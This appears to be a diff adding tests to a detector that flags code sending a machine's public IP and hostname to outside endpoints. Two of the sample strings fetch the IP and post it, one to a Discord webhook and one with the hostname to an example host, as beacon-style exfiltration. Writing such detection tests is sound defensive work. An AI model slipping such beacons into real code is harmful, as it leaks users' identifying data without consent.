@@ -713,3 +713,30 @@ class TestThePublicAddressIsIdentity:
             "requests.post('https://api.example.com/log', json=r.json())\n"
         )
         assert Flow.sent(source) == []
+
+    def test_a_weather_client_sending_its_lookup_to_its_api_in_a_function_is_not_identity(self):
+        source = (
+            "import requests\n"
+            "def forecast():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    return requests.get('https://api.weather.example/v1', params={'q': ip}).json()\n"
+        )
+        assert Flow.sent(source) == []
+
+    def test_a_lookup_sent_to_a_webhook_from_a_function_is_identity(self):
+        source = (
+            "import requests\n"
+            "def report():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    requests.post('https://discord.com/api/webhooks/1/x', json={'ip': ip})\n"
+        )
+        assert Flow.sent(source)
+
+    def test_a_lookup_sent_with_the_hostname_from_a_function_is_identity(self):
+        source = (
+            "import requests, socket\n"
+            "def report():\n"
+            "    ip = requests.get('https://api.ipify.org').text\n"
+            "    requests.post('https://api.example.com/x', json={'ip': ip, 'h': socket.gethostname()})\n"
+        )
+        assert Flow.sent(source)
